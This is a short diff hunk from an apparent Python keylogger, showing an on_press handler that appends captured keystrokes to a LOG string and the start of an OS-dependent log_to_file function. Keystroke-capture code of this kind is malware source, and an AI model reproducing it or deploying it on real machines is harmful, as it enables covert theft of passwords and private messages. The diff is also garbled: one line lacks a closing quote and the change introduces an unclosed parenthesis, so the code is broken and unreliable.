@@ -23,7 +23,7 @@ def on_press(key):
 		elif key == key.tab: LOG += '\t
 		elif key == key.cmd: LOG += ' cmd+'
 		else:
-			LOG += str(key) # Append any other special key not handled above.
+			LOG += str(key
 
 def log_to_file():
 	if SYSTEM == 'Linux':
